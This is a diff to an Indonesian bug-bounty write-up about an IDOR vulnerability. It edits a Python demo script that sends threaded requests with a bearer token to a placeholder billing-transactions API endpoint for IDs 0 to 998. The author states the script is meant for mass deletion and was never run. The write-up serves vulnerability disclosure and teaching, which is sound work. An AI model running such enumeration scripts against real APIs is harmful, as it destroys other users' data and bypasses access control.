@@ -99,7 +99,7 @@ Prinsipnya tetap sama, setiap endpoint yang memproses data baik yang terlihat di
 
 Saya tidak menjalankan kode ini karena melanggar etika dan aturan program. Kode ini hanya ditampilkan sebagai contoh (demo) untuk *mass deletion billing transactions* melalui IDOR, bukan untuk digunakan di sistem nyata.
 
-idor.py
+$ python3 idor.py
 
 ```python
 
@@ -116,6 +116,7 @@ def exploit_idor(session, billing_id):
     url = f"https://private.com/api/v1/app/billingTransactions/{billing_id}"
     headers = {
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+        "Accept": "application/json, text/plain, */*",
         "Authorization": "Bearer <token>",
         "X-App": "hr"
     }
@@ -133,8 +134,8 @@ def main():
     try:
         with requests.Session() as session:
             with ThreadPoolExecutor(max_workers=max_workers) as executor:
-# Iterate over a squence of integers
-# range(999) -> 0, 1, 2, ..., 998
+                # Iterate over a squence of integers
+                # range(999) -> 0, 1, 2, ..., 998
                 executor.map(lambda i: exploit_idor(session, i), range(999))
     except Exception as e:
         print(f"Error: {e}")
